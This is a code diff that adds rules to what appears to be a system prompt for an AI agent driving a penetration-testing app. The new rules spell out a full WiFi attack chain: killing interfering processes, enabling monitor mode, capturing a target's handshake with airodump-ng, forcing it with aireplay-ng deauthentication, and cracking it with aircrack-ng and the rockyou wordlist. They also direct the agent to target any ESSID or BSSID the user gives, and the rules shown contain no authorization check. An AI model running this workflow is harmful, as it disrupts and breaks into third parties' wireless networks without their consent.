@@ -29,7 +29,12 @@ Rules:
 4. Replace {target}, {url}, {domain} etc with values from user's request
 5. Maxim app is at ~/maxim/, launched via: bash -c 'cd ~/maxim && python3 -m maxim'
 6. NEVER use nmap for WiFi — use airmon-ng/airodump-ng
-7. WiFi interface: wlan0, monitor mode: wlan0mon
+7. WiFi interface: wlan0, monitor mode: wlan0mon (app auto-selects adapter)
+8. WiFi handshake capture workflow: sudo airmon-ng check kill && sudo airmon-ng start wlan0 && sudo airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon
+9. Deauth to force handshake: sudo aireplay-ng --deauth 10 -a {bssid} wlan0mon
+10. Crack captured handshake: sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+11. When user gives ESSID name, scan first to find BSSID and channel, then target it
+12. When user gives BSSID directly, use it with airodump-ng to capture handshake
 
 COMMAND REFERENCE (use these exact commands):
 """ + COMMAND_KB
